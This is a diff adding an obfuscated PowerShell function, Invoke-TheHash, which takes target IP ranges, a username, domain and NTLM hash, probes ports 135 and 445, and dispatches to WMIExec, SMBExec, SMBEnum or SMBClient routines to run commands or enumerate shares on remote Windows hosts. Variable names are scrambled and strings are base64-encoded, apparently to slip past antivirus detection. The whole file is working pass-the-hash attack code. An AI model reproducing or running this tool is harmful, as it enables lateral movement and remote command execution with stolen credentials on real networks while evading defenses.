@@ -1,0 +1,232 @@
+function Invoke-TheHash
+{
+[CmdletBinding(DefaultParametersetName='Default')]
+param
+(
+    [parameter(Mandatory=$true)][Array]$Target,
+    [parameter(Mandatory=$false)][Array]$TargetExclude,
+    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
+    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
+    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Action = "All",
+    [parameter(Mandatory=$false)][String]$Group = "Administrators",
+    [parameter(Mandatory=$false)][String]$Service,
+    [parameter(Mandatory=$false)][String]$Command,
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
+    [parameter(Mandatory=$true)][ValidateSet("SMBClient","SMBEnum","SMBExec","WMIExec")][String]$Type,
+    [parameter(Mandatory=$false)][Int]$PortCheckTimeout = 100,
+    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
+    [parameter(Mandatory=$false)][Switch]$PortCheckDisable,
+    [parameter(Mandatory=$false)][Int]$Sleep
+)
+${_/===\/\_/\___/==} = New-Object System.Collections.ArrayList
+${/===\_/\/\/==\_/\} = New-Object System.Collections.ArrayList
+if($Type -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBNAEkARQB4AGUAYwA='))))
+{
+    $Sleep = 10
+}
+else
+{
+    $Sleep = 150
+}
+for(${/=\_/\___/\_____/}=0;${/=\_/\___/\_____/} -lt $target.Count;${/=\_/\___/\_____/}++)
+{
+    if($target[${/=\_/\___/\_____/}] -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtACoA'))))
+    {
+        ${_/\/=\/\_/==\__/\} = $target[${/=\_/\___/\_____/}].split("-")
+        if(${_/\/=\/\_/==\__/\}[0] -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))) -and
+        ${_/\/=\/\_/==\__/\}[1] -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))))
+        {
+            if(${_/\/=\/\_/==\__/\}.Count -ne 2 -or ${_/\/=\/\_/==\__/\}[1] -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAFwAZABdACsAJAA='))) -or ${_/\/=\/\_/==\__/\}[1] -gt 254)
+            {
+                echo "[!] Invalid target $($target[${/=\_/\___/\_____/}])"
+                throw
+            }
+            else
+            {
+                ${_/\/=\/\/=\_/\/=\} = ${_/\/=\/\_/==\__/\}[0].ToCharArray()
+                [Array]::Reverse(${_/\/=\/\/=\_/\/=\})
+                ${_/\/=\/\/=\_/\/=\} = -join(${_/\/=\/\/=\_/\/=\})
+                ${_/\/=\/\/=\_/\/=\} = ${_/\/=\/\/=\_/\/=\}.SubString(${_/\/=\/\/=\_/\/=\}.IndexOf("."))
+                ${_/\/=\/\/=\_/\/=\} = ${_/\/=\/\/=\_/\/=\}.ToCharArray()
+                [Array]::Reverse(${_/\/=\/\/=\_/\/=\})
+                ${_/\/=\/\/=\_/\/=\} = -join(${_/\/=\/\/=\_/\/=\})
+                ${/==\/===\/=\/=\_/} = ${_/\/=\/\/=\_/\/=\} + ${_/\/=\/\_/==\__/\}[1]
+                $target[${/=\_/\___/\_____/}] = ${_/\/=\/\_/==\__/\}[0] + "-" + ${/==\/===\/=\/=\_/}
+            }
+        }
+    }
+}
+function ___/\/\_/\_/\_/\_/
+{
+    param(${__/=\/\/\/\/===\_/},${_/======\/\/===\_/},${__/\/\/=\_/\___/=\},${_/=\_/\/\_/=\/===\})
+    function _/=\/\_/=====\/=\/
+    { 
+        param(${__/=\/\/\/\/===\_/}) 
+        ${/=\/=\/=\/=\/\_/\} = ${__/=\/\/\/\/===\_/}.split(".")
+        return [int64]([int64]${/=\/=\/=\/=\/\_/\}[0] * 16777216 + [int64]${/=\/=\/=\/=\/\_/\}[1]*65536 + [int64]${/=\/=\/=\/=\/\_/\}[2] * 256 + [int64]${/=\/=\/=\/=\/\_/\}[3]) 
+    } 
+    function ___/\/=\/\__/=====
+    { 
+        param ([int64]${__/===\/==\__/\/==}) 
+        return (([math]::truncate(${__/===\/==\__/\/==}/16777216)).tostring() + "." +([math]::truncate((${__/===\/==\__/\/==}%16777216)/65536)).tostring() + "." + ([math]::truncate((${__/===\/==\__/\/==}%65536)/256)).tostring() + "." +([math]::truncate(${__/===\/==\__/\/==}%256)).tostring())
+    }
+    ${_/===\/\_/\___/==} = New-Object System.Collections.ArrayList
+    if(${__/=\/\/\/\/===\_/})
+    {
+        ${/==\/=\__/=\_/===} = [System.Net.IPAddress]::Parse(${__/=\/\/\/\/===\_/})
+    }
+    if(${_/======\/\/===\_/})
+    {
+        ${/==\/\_/\/===\/\/} = [System.Net.IPAddress]::Parse((___/\/=\/\__/===== -__/===\/==\__/\/== ([convert]::ToInt64(("1" * ${_/======\/\/===\_/} + "0" * (32 - ${_/======\/\/===\_/})),2))))
+    }
+    if(${__/=\/\/\/\/===\_/})
+    {
+        ${_/===\/\__/\/=\__} = New-Object System.Net.IPAddress (${/==\/\_/\/===\/\/}.address -band ${/==\/=\__/=\_/===}.address)
+    }
+    if(${__/=\/\/\/\/===\_/})
+    {
+        ${_/\/\_/===\______} = New-Object System.Net.IPAddress (([System.Net.IPAddress]::parse($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA1ADUALgAyADUANQAuADIANQA1AC4AMgA1ADUA')))).address -bxor ${/==\/\_/\/===\/\/}.address -bor ${_/===\/\__/\/=\__}.address))
+    } 
+    if(${__/=\/\/\/\/===\_/})
+    { 
+        ${__/\_/=\____/\_/\} = _/=\/\_/=====\/=\/ -__/=\/\/\/\/===\_/ ${_/===\/\__/\/=\__}.IPAddressToString
+        ${___/\/==\_/=\__/=} = _/=\/\_/=====\/=\/ -__/=\/\/\/\/===\_/ ${_/\/\_/===\______}.IPAddressToString
+    }
+    else
+    { 
+        ${__/\_/=\____/\_/\} = _/=\/\_/=====\/=\/ -__/=\/\/\/\/===\_/ ${__/\/\/=\_/\___/=\} 
+        ${___/\/==\_/=\__/=} = _/=\/\_/=====\/=\/ -__/=\/\/\/\/===\_/ ${_/=\_/\/\_/=\/===\} 
+    } 
+    for(${/=\_/\___/\_____/} = ${__/\_/=\____/\_/\}; ${/=\_/\___/\_____/} -le ${___/\/==\_/=\__/=}; ${/=\_/\___/\_____/}++) 
+    { 
+        ${/==\/=\__/=\_/===} = ___/\/=\/\__/===== -__/===\/==\__/\/== ${/=\_/\___/\_____/}
+        ${_/===\/\_/\___/==}.Add(${/==\/=\__/=\_/===}) > $null
+    }
+    if(${_/===\/\__/\/=\__})
+    {
+        ${_/===\/\_/\___/==}.Remove(${_/===\/\__/\/=\__}.IPAddressToString)
+    }
+    if(${_/\/\_/===\______})
+    {
+        ${_/===\/\_/\___/==}.Remove(${_/\/\_/===\______}.IPAddressToString)
+    }
+    return ${_/===\/\_/\___/==}
+}
+function _/=\______/===\__/
+{
+    param(${_/====\_/\_/=\/\__})
+    ${_/===\/\_/\___/==} = New-Object System.Collections.ArrayList
+    ForEach(${/===\_/\/=\__/\_/} in ${_/====\_/\_/=\/\__})
+    {
+        ${__/=\_/\/\_/\_/\/} = $null
+        if(${/===\_/\/=\__/\_/}.contains("/"))
+        {
+            ${__/=\_/\/\_/\_/\/} = ${/===\_/\/=\__/\_/}.Split("/")
+            ${__/=\/\/\/\/===\_/} = ${__/=\_/\/\_/\_/\/}[0]
+            ${_/======\/\/===\_/} = ${__/=\_/\/\_/\_/\/}[1]
+            ${_/===\/\_/\___/==}.AddRange($(___/\/\_/\_/\_/\_/ -__/=\/\/\/\/===\_/ ${__/=\/\/\/\/===\_/} -_/======\/\/===\_/ ${_/======\/\/===\_/}))
+        }
+        elseif(${/===\_/\/=\__/\_/}.contains("-"))
+        {
+            ${__/=\_/\/\_/\_/\/} = ${/===\_/\/=\__/\_/}.Split("-")
+            if(${__/=\_/\/\_/\_/\/}[0] -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))) -and
+            ${__/=\_/\/\_/\_/\/}[1] -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))))
+            {
+                ${__/\_/=\____/\_/\} = ${__/=\_/\/\_/\_/\/}[0]
+                ${___/\/==\_/=\__/=} = ${__/=\_/\/\_/\_/\/}[1]
+                ${_/===\/\_/\___/==}.AddRange($(___/\/\_/\_/\_/\_/ -__/\/\/=\_/\___/=\ ${__/\_/=\____/\_/\} -_/=\_/\/\_/=\/===\ ${___/\/==\_/=\__/=}))
+            }
+            else
+            {
+                ${_/===\/\_/\___/==}.Add(${/===\_/\/=\__/\_/}) > $null    
+            }
+        }
+        else
+        {
+            ${_/===\/\_/\___/==}.Add(${/===\_/\/=\__/\_/}) > $null
+        }
+    }
+    return ${_/===\/\_/\___/==}
+}
+[Array]${_/===\/\_/\___/==} = _/=\______/===\__/ $Target
+if($TargetExclude)
+{
+    ${/===\_/\/\/==\_/\} = _/=\______/===\__/ $TargetExclude
+    ${_/===\/\_/\___/==} = diff -ReferenceObject ${/===\_/\/\/==\_/\} -DifferenceObject ${_/===\/\_/\___/==} -PassThru
+}
+if(${_/===\/\_/\___/==}.Count -gt 0)
+{
+    foreach(${_/\/\/\__/===\/==} in ${_/===\/\_/\___/==})
+    {
+        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdABpAG4AZwAgACQAewBfAC8AXAAvAFwALwBcAF8AXwAvAD0APQA9AFwALwA9AD0AfQA=')))
+        if($type -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBNAEkARQB4AGUAYwA='))))
+        {
+            if(!$PortCheckDisable)
+            {
+                ${_/=\__/\____/====} = New-Object System.Net.Sockets.TCPClient
+                ${/=\/=\/=\/==\/==\} = ${_/=\__/\____/====}.BeginConnect(${_/\/\/\__/===\/==},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAzADUA'))),$null,$null)
+                ${___/=\/=\__/=\/==} = ${/=\/=\/=\/==\/==\}.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
+                ${_/=\__/\____/====}.Close()
+            }
+            if(${___/=\/=\__/=\/==} -or $PortCheckDisable)
+            {
+                Invoke-WMIExec -username $Username -domain $Domain -hash $Hash -command $Command -target ${_/\/\/\__/===\/==} -sleep $Sleep -Verbose:$VerbosePreference
+            }
+        }
+        elseif($Type -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAKgA='))))
+        {
+            if(!$PortCheckDisable)
+            {
+                ${_/\/=\__/\__/==\_} = New-Object System.Net.Sockets.TCPClient
+                ${/=\/\_/=\__/==\_/} = ${_/\/=\__/\__/==\_}.BeginConnect(${_/\/\/\__/===\/==},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))),$null,$null)
+                ${_/=\/\__/\/===\/\} = ${/=\/\_/=\__/==\_/}.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
+                ${_/\/=\__/\__/==\_}.Close()
+            }
+            if(${_/=\/\__/\/===\/\} -or $PortCheckDisable)
+            {
+                switch($Type)
+                {
+                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAQwBsAGkAZQBuAHQA')))
+                    {
+                        ${__/==\_____/\_/=\} = "\\" + ${_/\/\/\__/===\/==} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABjACQA')))
+                        if($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaAA='))))
+                        {
+                            Invoke-SMBClient -username $Username -domain $Domain -hash $Hash -source ${__/==\_____/\_/=\} -sleep $Sleep -Verbose:$VerbosePreference
+                        }
+                        else
+                        {
+                            Invoke-SMBClient -source ${__/==\_____/\_/=\} -sleep $Sleep -Verbose:$VerbosePreference
+                        }
+                    }
+                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIARQBuAHUAbQA=')))
+                    {
+                        if($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaAA='))))
+                        {
+                            Invoke-SMBEnum -username $Username -domain $Domain -hash $Hash -target ${_/\/\/\__/===\/==} -sleep $Sleep -Action $Action -TargetShow -Verbose:$VerbosePreference
+                        }
+                        else
+                        {
+                            Invoke-SMBEnum -target ${_/\/\/\__/===\/==} -sleep $Sleep -Verbose:$VerbosePreference
+                        }
+                    }
+                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIARQB4AGUAYwA=')))
+                    {
+                        if($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaAA='))))
+                        {
+                            Invoke-SMBExec -username $Username -domain $Domain -hash $Hash -command $Command -CommandCOMSPEC $CommandCOMSPEC -Service $Service -target ${_/\/\/\__/===\/==} -sleep $Sleep -Verbose:$VerbosePreference
+                        }
+                        else
+                        {
+                            Invoke-SMBExec -target ${_/\/\/\__/===\/==} -sleep $Sleep -Verbose:$VerbosePreference
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+else
+{
+    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABUAGEAcgBnAGUAdAAgAGwAaQBzAHQAIABpAHMAIABlAG0AcAB0AHkA')))    
+}
+}
